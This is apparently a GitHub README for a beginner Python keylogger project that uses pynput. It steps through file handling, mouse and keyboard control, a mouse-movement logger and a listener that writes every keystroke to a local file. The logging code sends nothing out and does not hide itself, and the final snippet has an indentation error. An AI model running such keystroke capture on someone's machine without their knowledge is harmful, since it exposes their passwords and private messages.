# Keylogger
---

I made basic key-logger which can log every activity of keyboard and mouse when activated.
In making of this I learned file handling, keyboard control, mouse control, and input logging using the `pynput` library.  

This is one step towards automation of own tools with having understanding of underlying process occurring.

---

Requirements

Python 3.x

Install dependency:

```
python3 -m venv venv
source venv/bin/activate
pip install pynput
```

---

# How to Run

Clone the repository:

```
git clone https://github.com/leathermajesty/keylogger.git
cd keylogger
```

Run any script:

```
python3 8_listening_keyboard3.py
```

---

### 0. Setup virtual environment

- Create virtual environment to seperate dependencies
```
python3 -m venv venv
```

- Activate virtual environment
```
source venv/bin/activate
```

- Install pynput 
```
pip install pynput
```

### 1. Basic File Handling

Demonstrates how to open, write, and close files in Python.
- Creates a file named `log.txt`
- Writes a simple message into it

Example:
```
f = open("log.txt","w")
f.write("Hello World")
f.close()
```

Output:- 

<img width="341" height="50" alt="Image" src="https://github.com/user-attachments/assets/4e51770d-aef6-4485-bd8b-59fc0d79a179" />

---

### 2. File Handling Using Context Manager

Uses Python's `with` statement which automatically handles file closing.

Features:
- Appends new text to `log.txt`
- Safer and cleaner file handling

Example:

```
with open("log.txt","a") as f:
    f.write("\nAppending text")
```

Output:- 

<img width="288" height="61" alt="Image" src="https://github.com/user-attachments/assets/a8f01676-9ae2-425a-819f-7b44eb531ebb" />


---

### 3. Mouse Control with `pynput`

Demonstrates how to programmatically control the mouse cursor.

Features:
- Moves mouse to a specific screen coordinate

Example behavior:
- Moves the cursor to (600,300)
```
from pynput.mouse import Controller
def ControlMouse():
	mouse = Controller()
	mouse.position = (600,300)
ControlMouse()
```

Output:- 

https://github.com/user-attachments/assets/fd450add-7a76-4408-9406-0f8b47aea71f

---

### 4. Keyboard Control with `pynput`

Shows how to simulate keyboard typing.

Features:

- Automatically types text using Python

Example behavior:
- Types: `"Hi"`
```
import time
from pynput.keyboard import Controller

def ControlKeyboard():
	keyboard = Controller()

# Wait 3 seconds before starting

	time.sleep(3)
	keyboard.type("Hi")
ControlKeyboard()
```

Output:- 

https://github.com/user-attachments/assets/08d655b9-7393-4e2f-8690-f7c81db6a870

---

### 5. Basic Keyboard Listener (Key Logger Example)

Captures keyboard inputs and saves them to a file.

Features:

- Listens for key presses    
- Stores captured keys in `keylog.txt`


Output:- 

https://github.com/user-attachments/assets/b1df8d7d-753f-48b1-9ffc-6e5f1ccd167e

---

### 6. Mouse Movement Listener

Tracks mouse movement across the screen.

Features:
- Prints cursor position
- Logs coordinates into `movement.txt`

```
from pynput.mouse import Listener

def printcordinate(x,y):
	with open("movement.txt",'a') as f:
		f.write(str((x,y))+"\n")

with Listener(on_move=printcordinate) as l:
	l.join()
```

Output:- 

https://github.com/user-attachments/assets/502dd71a-79f8-4b13-99d4-bbd78ee92611

---

### 7. Advanced Keyboard Listener

Improved keyboard logging with key formatting.

Enhancements:

- Converts `Key.space` → space
- Ignores shift key
- Writes clean readable text to `keylog.txt`

```
from pynput.keyboard import Listener

def writefile(key):
	letter = str(key).replace("'","")
	if letter == 'Key.space':
		letter = ' '
	if letter == 'Key.shift':
		letter = ''
	if letter == 'Key.enter':
		letter = '\n'
		
	with open("keylog.txt","a") as f:
	f.write(letter)

with Listener(on_press=writefile) as l:
	l.join()
```

Output:- 

https://github.com/user-attachments/assets/6e012123-16be-4d45-b14e-ba31679ebaa4

---


# Use Cases

These scripts demonstrate concepts used in:

- Automation tools
    
- Input monitoring
    
- Human-computer interaction research
    
- Security research & malware analysis labs
    
- Python system programming practice
    

---

# Disclaimer

This project is for **educational and research purposes only**.  

---
